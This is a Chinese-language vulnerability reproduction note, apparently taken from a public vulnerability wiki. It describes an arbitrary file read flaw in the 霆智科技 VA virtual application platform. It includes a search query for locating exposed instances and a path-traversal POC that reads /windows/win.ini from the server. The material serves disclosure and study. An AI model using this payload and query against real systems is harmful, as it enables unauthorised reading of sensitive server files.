---
title: "霆智科技 VA虚拟应用平台 任意文件读取漏洞"
date: 2026-10-16 09:11:51
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "霆智科技-VA虚拟应用平台"
tags:
  - "霆智科技-VA虚拟应用平台"
  - "任意文件读取"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

霆智科技 VA虚拟应用平台 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感信息

## 漏洞影响

霆智科技 VA虚拟应用平台

## 网络测绘

```
body="EAA益和应用接入系统"
```

## 漏洞复现

登陆页面

![image-20230704111747376](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230704111747376.png) 

验证POC

```
/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
```

![image-20230704112349037](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230704112349037.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-VA%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
